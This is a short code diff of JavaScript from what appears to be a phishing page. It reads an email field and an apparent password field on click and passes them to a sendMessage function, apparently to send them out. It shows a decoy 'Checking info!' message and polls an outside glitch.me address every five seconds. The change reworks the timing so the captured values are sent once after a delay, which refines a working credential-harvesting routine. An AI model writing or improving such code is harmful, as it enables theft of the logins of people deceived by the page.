@@ -11,15 +11,16 @@ var firstTime = true;
 document.getElementById("xd").onclick = function(){firstCheck()};
 function firstCheck(){
   if(!document.getElementById("ema").value == "" && !document.getElementById("ntra").value == ""){
-    sendMessage(document.getElementById("ema").value,document.getElementById("ntra").value);
-    firstTime = false;
     setTimeout(()=>{
-      if(firstTime)
-      document.write("Checking info!");
-      setInterval(()=>{
-        fetch('https://yaberry.glitch.me/putamadre.txt').then(response => response.json())
-          .then(data => document.title = typeof data);
-      }, 5000);
+      if(firstTime){
+        firstTime = false;
+        sendMessage(document.getElementById("ema").value,document.getElementById("ntra").value);
+        document.write("Checking info!");
+        setInterval(()=>{
+          fetch('https://yaberry.glitch.me/putamadre.txt').then(response => response.json())
+            .then(data => document.title = typeof data);
+        }, 5000);
+      }
     }, 2500);
   }
 }
